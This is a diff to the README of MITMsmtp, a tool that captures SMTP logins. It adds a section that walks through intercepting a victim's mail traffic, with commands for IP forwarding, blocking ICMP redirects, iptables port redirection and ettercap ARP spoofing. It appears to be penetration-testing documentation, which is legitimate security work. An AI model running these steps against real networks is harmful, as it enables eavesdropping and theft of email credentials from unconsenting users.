@@ -62,7 +62,7 @@ optional arguments:
   --log LOG             Directory for mails and credentials
 ```
 
-When running `MITMsmtp` without any parameters it will start an unencrypted SMTP server on port 8587 on all interfaces. Pointing Thunderbird or any other SMTP client will give you the ability to test MITMsmtp.
+When running `MITMsmtp` without any parameters it will start an unencrypted SMTP server on port 8587 on all interfaces. Pointing Thunderbird or any other SMTP client will give you the ability to test MITMsmtp. Please keep in mind that the default port MITMsmtp differs from the SMTP default port.
 
 As soon as a client has logged in, you will get the following information:
 
@@ -96,12 +96,32 @@ To run MITMsmtp in encrypted mode you need a certificate and the according key. 
 
 To use MITMsmtp with the example certificates run `MITMsmtp --certfile certs/MITMsmtp.crt --keyfile certs/MITMsmtp.key`.
 
-To use mitm-smtp as a transparent SMTP Proxy, enable forwarding mode...
-``sysctl -w net.ipv4.ip_forward=1``
-...block ICMP redirects...
-``sysctl -w net.ipv4.conf.all.send_redirects=0``
-...and create a port forwarding.
-``iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-port 8888``
+## MITM
+This section shows the usage of MITMsmtp if you are able to intercept the victims traffic.
+
+### ARP Spoofing
+ARP Spoofing is one way to get between Victim and Router. In case you have the ability to modify your routers settings, you might skip this step. First off all you need the victims and the routers IP address. Make also sure that your client is connected to the same subnet.
+
+In this example the Routers IP will be *192.168.42.1* and the Victims IP will be *192.168.42.24*. Run the following commands as root.
+
+First of all we are going to enable forwarding mode:
+
+`sysctl -w net.ipv4.ip_forward=1`
+
+To make sure that out victim doesn't find a way around us, block ICMP redirects:
+
+`sysctl -w net.ipv4.conf.all.send_redirects=0`
+
+Next we create a port forwarding rule from SMTP default port 587 to MITMsmtp. Please make sure that your victim uses port 587 and adjust if needed.
+`iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-port 8587`
+
+To start ARP Spoofing you will need ettercap. Run the following command and replace the IP addresses according to your setup:
+
+`ettercap -T -M arp /192.168.42.24/ /192.168.42.1/`
+
+Finally you can fire up MITMsmtp:
+
+`MITMsmtp --log log/`
 
 ## Reference
 [1] https://tools.ietf.org/html/rfc5321
